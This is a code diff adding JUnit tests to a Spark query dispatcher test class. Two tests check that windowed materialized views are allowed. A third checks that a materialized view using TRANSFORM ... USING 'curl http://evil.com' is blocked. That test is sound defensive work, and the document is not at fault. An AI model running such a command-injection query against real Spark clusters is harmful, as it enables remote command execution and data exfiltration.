@@ -502,6 +502,77 @@ public class SparkQueryDispatcherTest {
   }
 
   @Test
+  void testDispatchMVWithWindowFunctionAllowed() {
+    when(emrServerlessClientFactory.getClient(any())).thenReturn(emrServerlessClient);
+    when(queryIdProvider.getQueryId(any(), any())).thenReturn(QUERY_ID);
+    when(emrServerlessClient.startJobRun(any())).thenReturn(EMR_JOB_ID);
+    DataSourceMetadata dataSourceMetadata = constructMyGlueDataSourceMetadata();
+    when(dataSourceService.verifyDataSourceAccessAndGetRawMetadata(
+            MY_GLUE, asyncQueryRequestContext))
+        .thenReturn(dataSourceMetadata);
+
+    String query =
+        "CREATE MATERIALIZED VIEW my_glue.default.mv_window AS"
+            + " SELECT window.start AS `start.time`, COUNT(*) AS count"
+            + " FROM my_glue.default.http_logs WHERE status != 200"
+            + " GROUP BY window(`@timestamp`, '1 Minutes')"
+            + " WITH (auto_refresh = true, refresh_interval = '1 Minutes',"
+            + " checkpoint_location = 's3://bucket/checkpoint',"
+            + " watermark_delay = '10 Minutes')";
+
+    DispatchQueryResponse response =
+        sparkQueryDispatcher.dispatch(getBaseDispatchQueryRequest(query), asyncQueryRequestContext);
+    verify(emrServerlessClient, times(1)).startJobRun(any());
+    assertEquals(EMR_JOB_ID, response.getJobId());
+  }
+
+  @Test
+  void testDispatchMVWithTumbleFunctionAllowed() {
+    when(emrServerlessClientFactory.getClient(any())).thenReturn(emrServerlessClient);
+    when(queryIdProvider.getQueryId(any(), any())).thenReturn(QUERY_ID);
+    when(emrServerlessClient.startJobRun(any())).thenReturn(EMR_JOB_ID);
+    DataSourceMetadata dataSourceMetadata = constructMyGlueDataSourceMetadata();
+    when(dataSourceService.verifyDataSourceAccessAndGetRawMetadata(
+            MY_GLUE, asyncQueryRequestContext))
+        .thenReturn(dataSourceMetadata);
+
+    String query =
+        "CREATE MATERIALIZED VIEW my_glue.default.mv_tumble AS"
+            + " SELECT window.start AS `start.time`, COUNT(*) AS count"
+            + " FROM my_glue.default.http_logs WHERE status != 200"
+            + " GROUP BY TUMBLE(`@timestamp`, '6 Hours')"
+            + " WITH (auto_refresh = false)";
+
+    DispatchQueryResponse response =
+        sparkQueryDispatcher.dispatch(getBaseDispatchQueryRequest(query), asyncQueryRequestContext);
+    verify(emrServerlessClient, times(1)).startJobRun(any());
+    assertEquals(EMR_JOB_ID, response.getJobId());
+  }
+
+  @Test
+  void testDispatchMVWithTransformBlocked() {
+    DataSourceMetadata dataSourceMetadata = constructMyGlueDataSourceMetadata();
+    when(dataSourceService.verifyDataSourceAccessAndGetRawMetadata(
+            MY_GLUE, asyncQueryRequestContext))
+        .thenReturn(dataSourceMetadata);
+
+    String query =
+        "CREATE MATERIALIZED VIEW my_glue.default.mv_exploit AS"
+            + " SELECT TRANSFORM(status) USING 'curl http://evil.com' AS x"
+            + " FROM my_glue.default.http_logs"
+            + " WITH (auto_refresh = false)";
+
+    IllegalArgumentException exception =
+        Assertions.assertThrows(
+            IllegalArgumentException.class,
+            () ->
+                sparkQueryDispatcher.dispatch(
+                    getBaseDispatchQueryRequest(query), asyncQueryRequestContext));
+    Assertions.assertTrue(exception.getMessage().contains("TRANSFORM is not allowed"));
+    verifyNoInteractions(emrServerlessClient);
+  }
+
+  @Test
   void testRefreshIndexQuery() {
     when(emrServerlessClientFactory.getClient(any())).thenReturn(emrServerlessClient);
     when(queryIdProvider.getQueryId(any(), any())).thenReturn(QUERY_ID);
